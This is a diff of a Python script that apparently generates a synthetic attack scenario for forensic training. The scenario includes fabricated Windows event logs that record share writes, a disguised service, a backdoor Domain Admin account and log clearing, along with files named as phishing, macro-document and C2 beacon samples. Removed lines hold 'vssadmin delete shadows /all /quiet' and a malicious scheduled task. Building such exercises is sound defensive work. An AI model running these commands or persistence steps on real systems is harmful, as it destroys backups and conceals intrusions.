-    </EventData>
-  </Event>
-
-  <!-- 14. Network Share Object Accessed: ADMIN$ (5140) at 10:00:40Z -->
+  <!-- 13. Network Share Access: ADMIN$ (5140) at 10:00:40Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>5140</EventID>
       <TimeCreated SystemTime="2026-10-10T10:00:40.000Z" />
-      <EventRecordID>8012</EventRecordID>
+      <EventRecordID>8006</EventRecordID>
       <Channel>Security</Channel>
       <Computer>DC-PROD-01.target.local</Computer>
     </System>
@@ -1643,17 +1686,17 @@ def build_host_b_evtx(pe_sha256: str, pe_md5: str):
       <Data Name="SubjectUserName">svc_admin</Data>
       <Data Name="SubjectDomainName">TARGET</Data>
       <Data Name="IpAddress">10.0.4.15</Data>
-      <Data Name="ShareName">\\\\*\\ADMIN$</Data>
+      <Data Name="ShareName">\\*\ADMIN$</Data>
     </EventData>
   </Event>
 
-  <!-- 15. Network Share Detailed Access Check: beacon_updater.exe (5145) at 10:00:41Z -->
+  <!-- 14. Network Share Object Written: beacon_updater.exe (5145) at 10:00:41Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>5145</EventID>
       <TimeCreated SystemTime="2026-10-10T10:00:41.000Z" />
-      <EventRecordID>8013</EventRecordID>
+      <EventRecordID>8007</EventRecordID>
       <Channel>Security</Channel>
       <Computer>DC-PROD-01.target.local</Computer>
     </System>
@@ -1661,75 +1704,57 @@ def build_host_b_evtx(pe_sha256: str, pe_md5: str):
       <Data Name="SubjectUserName">svc_admin</Data>
       <Data Name="SubjectDomainName">TARGET</Data>
       <Data Name="IpAddress">10.0.4.15</Data>
-      <Data Name="ShareName">\\\\*\\ADMIN$</Data>
-      <Data Name="RelativeTargetName">System32\\beacon_updater.exe</Data>
+      <Data Name="ShareName">\\*\ADMIN$</Data>
+      <Data Name="RelativeTargetName">System32\beacon_updater.exe</Data>
       <Data Name="AccessMask">0x12019F</Data>
     </EventData>
   </Event>
 
-  <!-- 16. Lateral Movement Persistence: Remote Service Installed (7045) at 10:00:45Z -->
+  <!-- 15. Service Creation: WindowsDefendUpdateSvc (7045) at 10:00:45Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
-      <Provider Name="Service Control Manager" Guid="{{555908d1-a6d7-4695-8e1e-26931d2012f4}}" />
+      <Provider Name="Service Control Manager" />
       <EventID>7045</EventID>
       <TimeCreated SystemTime="2026-10-10T10:00:45.000Z" />
-      <EventRecordID>8016</EventRecordID>
+      <EventRecordID>8008</EventRecordID>
       <Channel>System</Channel>
       <Computer>DC-PROD-01.target.local</Computer>
     </System>
     <EventData>
       <Data Name="ServiceName">WindowsDefendUpdateSvc</Data>
-      <Data Name="ImagePath">C:\\Windows\\System32\\beacon_updater.exe --service</Data>
+      <Data Name="ImagePath">C:\Windows\System32\beacon_updater.exe --service</Data>
       <Data Name="ServiceType">user mode service</Data>
       <Data Name="StartType">auto start</Data>
       <Data Name="AccountName">LocalSystem</Data>
     </EventData>
   </Event>
 
-  <!-- 17. Process Creation (4688) of beacon_updater.exe on DC-PROD-01 at 10:00:50Z -->
+  <!-- 16. Process Creation: beacon_updater.exe executed by Service (4688) at 10:00:48Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>4688</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:50.000Z" />
-      <EventRecordID>8018</EventRecordID>
+      <TimeCreated SystemTime="2026-10-10T10:00:48.000Z" />
+      <EventRecordID>8009</EventRecordID>
       <Channel>Security</Channel>
       <Computer>DC-PROD-01.target.local</Computer>
     </System>
     <EventData>
       <Data Name="SubjectUserName">SYSTEM</Data>
-      <Data Name="NewProcessName">C:\\Windows\\System32\\beacon_updater.exe</Data>
-      <Data Name="CommandLine">"C:\\Windows\\System32\\beacon_updater.exe" --service</Data>
-      <Data Name="ParentProcessName">C:\\Windows\\System32\\services.exe</Data>
+      <Data Name="NewProcessName">C:\Windows\System32\beacon_updater.exe</Data>
+      <Data Name="CommandLine">"C:\Windows\System32\beacon_updater.exe" --service</Data>
+      <Data Name="ParentProcessName">C:\Windows\System32\services.exe</Data>
       <Data Name="Hashes">MD5={pe_md5},SHA256={pe_sha256}</Data>
     </EventData>
   </Event>
 
-  <!-- 18. Process Creation: Reconnaissance whoami /priv (4688) at 10:00:52Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Security-Auditing" />
-      <EventID>4688</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:52.000Z" />
-      <EventRecordID>8019</EventRecordID>
-      <Channel>Security</Channel>
-      <Computer>DC-PROD-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="SubjectUserName">SYSTEM</Data>
-      <Data Name="NewProcessName">C:\\Windows\\System32\\cmd.exe</Data>
-      <Data Name="CommandLine">cmd.exe /c whoami /priv</Data>
-      <Data Name="ParentProcessName">C:\\Windows\\System32\\beacon_updater.exe</Data>
-    </EventData>
-  </Event>
-
-  <!-- 19. Active Directory Backdoor: User Account Created svc_backdoor (4720) at 10:00:54Z -->
+  <!-- 17. User Account Created: svc_backdoor (4720) at 10:01:00Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>4720</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:54.000Z" />
-      <EventRecordID>8020</EventRecordID>
+      <TimeCreated SystemTime="2026-10-10T10:01:00.000Z" />
+      <EventRecordID>8010</EventRecordID>
       <Channel>Security</Channel>
       <Computer>DC-PROD-01.target.local</Computer>
     </System>
@@ -1738,91 +1763,33 @@ def build_host_b_evtx(pe_sha256: str, pe_md5: str):
       <Data Name="TargetDomainName">TARGET</Data>
       <Data Name="SubjectUserName">svc_admin</Data>
       <Data Name="SubjectDomainName">TARGET</Data>
-      <Data Name="SamAccountName">svc_backdoor</Data>
     </EventData>
   </Event>
 
-  <!-- 20. Active Directory Backdoor: Added to Domain Admins (4728) at 10:00:57Z -->
+  <!-- 18. Member Added to Security Group: Domain Admins (4728) at 10:01:02Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>4728</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:57.000Z" />
-      <EventRecordID>8023</EventRecordID>
+      <TimeCreated SystemTime="2026-10-10T10:01:02.000Z" />
+      <EventRecordID>8011</EventRecordID>
       <Channel>Security</Channel>
       <Computer>DC-PROD-01.target.local</Computer>
     </System>
     <EventData>
       <Data Name="MemberName">CN=svc_backdoor,CN=Users,DC=target,DC=local</Data>
-      <Data Name="MemberSid">S-1-5-21-397955417-626881126-188441454-1105</Data>
       <Data Name="TargetUserName">Domain Admins</Data>
-      <Data Name="TargetDomainName">TARGET</Data>
-      <Data Name="TargetSid">S-1-5-21-397955417-626881126-188441454-512</Data>
       <Data Name="SubjectUserName">svc_admin</Data>
-      <Data Name="SubjectDomainName">TARGET</Data>
     </EventData>
   </Event>
 
-  <!-- 21. Scheduled Task Persistence: UpdateTask Created (4698) at 10:01:05Z -->
+  <!-- 19. Anti-Forensics: Security Audit Log Cleared (1102) at 10:01:25Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
-      <Provider Name="Microsoft-Windows-Security-Auditing" />
-      <EventID>4698</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:01:05.000Z" />
-      <EventRecordID>8025</EventRecordID>
-      <Channel>Security</Channel>
-      <Computer>DC-PROD-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="SubjectUserName">svc_admin</Data>
-      <Data Name="SubjectDomainName">TARGET</Data>
-      <Data Name="TaskName">\\Microsoft\\Windows\\Maintenance\\UpdateTask</Data>
-      <Data Name="TaskContent">&lt;Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;&lt;Actions&gt;&lt;Exec&gt;&lt;Command&gt;C:\\Windows\\System32\\beacon_updater.exe&lt;/Command&gt;&lt;Arguments&gt;--periodic&lt;/Arguments&gt;&lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;</Data>
-    </EventData>
-  </Event>
-
-  <!-- 22. Ransomware Activity: Volume Shadow Copies Deletion (4688) at 10:01:20Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Security-Auditing" />
-      <EventID>4688</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:01:20.000Z" />
-      <EventRecordID>8026</EventRecordID>
-      <Channel>Security</Channel>
-      <Computer>DC-PROD-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="SubjectUserName">svc_admin</Data>
-      <Data Name="NewProcessName">C:\\Windows\\System32\\vssadmin.exe</Data>
-      <Data Name="CommandLine">vssadmin.exe delete shadows /all /quiet</Data>
-      <Data Name="ParentProcessName">C:\\Windows\\System32\\cmd.exe</Data>
-    </EventData>
-  </Event>
-
-  <!-- 23. Process Terminated: beacon_updater.exe (4689) at 10:01:28Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Security-Auditing" />
-      <EventID>4689</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:01:28.000Z" />
-      <EventRecordID>8031</EventRecordID>
-      <Channel>Security</Channel>
-      <Computer>DC-PROD-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="SubjectUserName">SYSTEM</Data>
-      <Data Name="ProcessName">C:\\Windows\\System32\\beacon_updater.exe</Data>
-      <Data Name="Status">0x0</Data>
-    </EventData>
-  </Event>
-
-  <!-- 24. Anti-Forensics: Security Audit Log Cleared (1102) at 10:01:30Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <Provider Name="Microsoft-Windows-Eventlog" />
       <EventID>1102</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:01:30.000Z" />
-      <EventRecordID>8032</EventRecordID>
+      <TimeCreated SystemTime="2026-10-10T10:01:25.000Z" />
+      <EventRecordID>8012</EventRecordID>
       <Channel>Security</Channel>
       <Computer>DC-PROD-01.target.local</Computer>
     </System>
@@ -1830,6 +1797,7 @@ def build_host_b_evtx(pe_sha256: str, pe_md5: str):
       <LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">
         <SubjectUserName>svc_admin</SubjectUserName>
         <SubjectDomainName>TARGET</SubjectDomainName>
+        <Channel>Security</Channel>
       </LogFileCleared>
     </UserData>
   </Event>
@@ -1840,42 +1808,42 @@ def build_host_b_evtx(pe_sha256: str, pe_md5: str):
     print(f"[+] Successfully wrote Host B EVTX: {out_file}")
 
 # -------------------------------------------------------------------------
-# Main Execution Pipeline
+# 9. Main Orchestrator
 # -------------------------------------------------------------------------
 if __name__ == "__main__":
     print("[=== Synthesizing Correlated Attack Scenario Files in Dependency Order ===]")
     
-    # 1. Staged Payload: 03_c2_implant_beacon.exe
-    pe_file = os.path.join(OUT_DIR, "03_c2_implant_beacon.exe")
-    with open(pe_file, "wb") as f:
+    # 1. 03_c2_implant_beacon.exe
+    pe_path = os.path.join(OUT_DIR, "03_c2_implant_beacon.exe")
+    with open(pe_path, "wb") as f:
         f.write(PE_BYTES)
-    print(f"[+] Staged PE written: {pe_file} ({len(PE_BYTES)} bytes)")
-    
-    # 2. Exfiltrated Archive: 07_exfiltrated_archive.zip
-    zip_file = os.path.join(OUT_DIR, "07_exfiltrated_archive.zip")
-    with open(zip_file, "wb") as f:
+    print(f"[+] Staged PE written: {pe_path} ({len(PE_BYTES)} bytes)")
+
+    # 2. 07_exfiltrated_archive.zip
+    zip_path = os.path.join(OUT_DIR, "07_exfiltrated_archive.zip")
+    with open(zip_path, "wb") as f:
         f.write(ZIP_BYTES)
-    print(f"[+] Exfil Zip written: {zip_file} ({len(ZIP_BYTES)} bytes)")
-    
-    # 3. Weaponized Document: 02_weaponized_document.docm
-    docm_file = os.path.join(OUT_DIR, "02_weaponized_document.docm")
-    with open(docm_file, "wb") as f:
+    print(f"[+] Exfil Zip written: {zip_path} ({len(ZIP_BYTES)} bytes)")
+
+    # 3. 02_weaponized_document.docm
+    docm_path = os.path.join(OUT_DIR, "02_weaponized_document.docm")
+    with open(docm_path, "wb") as f:
         f.write(DOCM_BYTES)
-    print(f"[+] Weaponized Doc written: {docm_file} ({len(DOCM_BYTES)} bytes)")
-    
-    # 4. Phishing Email: 01_phishing_email.msg
-    msg_file = os.path.join(OUT_DIR, "01_phishing_email.msg")
-    with open(msg_file, "wb") as f:
+    print(f"[+] Weaponized Doc written: {docm_path} ({len(DOCM_BYTES)} bytes)")
+
+    # 4. 01_phishing_email.msg
+    msg_path = os.path.join(OUT_DIR, "01_phishing_email.msg")
+    with open(msg_path, "wb") as f:
         f.write(MSG_BYTES)
-    print(f"[+] Phishing Email written: {msg_file} ({len(MSG_BYTES)} bytes)")
-    
-    # 5. Network Traffic Capture: 06_network_traffic_capture.pcap
+    print(f"[+] Phishing Email written: {msg_path} ({len(MSG_BYTES)} bytes)")
+
+    # 5. 06_network_traffic_capture.pcap
     build_pcap(PE_BYTES, ZIP_BYTES)
-    
-    # 6. Host A EVTX: 04_endpoint_workstation_hostA.evtx
+
+    # 6. 04_endpoint_workstation_hostA.evtx
     build_host_a_evtx(DOCM_SHA256, DOCM_MD5, PE_SHA256, PE_MD5, ZIP_SHA256, ZIP_MD5)
-    
-    # 7. Host B EVTX: 05_endpoint_domain_controller_hostB.evtx
+
+    # 7. 05_endpoint_domain_controller_hostB.evtx
     build_host_b_evtx(PE_SHA256, PE_MD5)
 
     print("\n[=== Artifact Cryptographic Verification Summary ===]")
